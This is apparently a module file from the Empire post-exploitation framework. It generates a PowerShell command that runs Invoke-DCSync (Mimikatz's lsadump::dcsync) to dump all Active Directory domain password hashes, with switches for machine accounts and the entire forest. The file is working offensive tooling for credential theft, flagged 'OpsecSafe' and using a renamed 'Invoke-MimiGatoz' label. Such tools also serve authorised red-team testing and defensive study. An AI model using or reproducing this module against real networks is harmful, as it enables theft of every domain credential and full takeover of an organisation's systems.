from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-MimiGatoz DCsync - Full Hashdump',

            'Author': ['@gentilkiwi', 'Vincent Le Toux', '@JosephBialek', "@harmj0y", "@monoxgas"],

            'Description': ("Runs PowerSploit's Invoke-MimiGatoz function "
                            "to collect all domain hashes using Mimikatz's"
                            "lsadump::dcsync module. This doesn't need code "
                            "execution on a given DC, but needs to be run from"
                            "a user context with DA equivalent privileges."),

            'Background' : True,

            'OutputExtension' : None,
            
            'NeedsAdmin' : False,

            'OpsecSafe' : True,

            'MinPSVersion' : '2',
            
            'Comments': [
                'http://blog.gentilkiwi.com',
                'http://clymb3r.wordpress.com/'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Computers' : {
                'Description'   :   'Switch. Include machine hashes in the dump',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Domain' : {
                'Description'   :   'Specified (fqdn) domain to pull for the primary domain/DC.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Forest' : {
                'Description'   :   'Switch. Pop the big daddy (forest) as well.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Active' : {
                'Description'   :   'Switch. Only collect hashes for accounts marked as active. Default is True',
                'Required'      :   False,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu
        
        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):
        
        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "data/module_source/credentials/Invoke-DCSync.ps1"

        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode

        script += "Invoke-DCSync -PWDumpFormat "

        if self.options["Domain"]['Value'] != '':
            script += " -Domain " + self.options['Domain']['Value']

        if self.options["Forest"]['Value'] != '':
            script += " -DumpForest "

        if self.options["Computers"]['Value'] != '':
            script += " -GetComputers "

        if self.options["Active"]['Value'] == '':
            script += " -OnlyActive:$false "

        script += "| Out-String;"

        return script
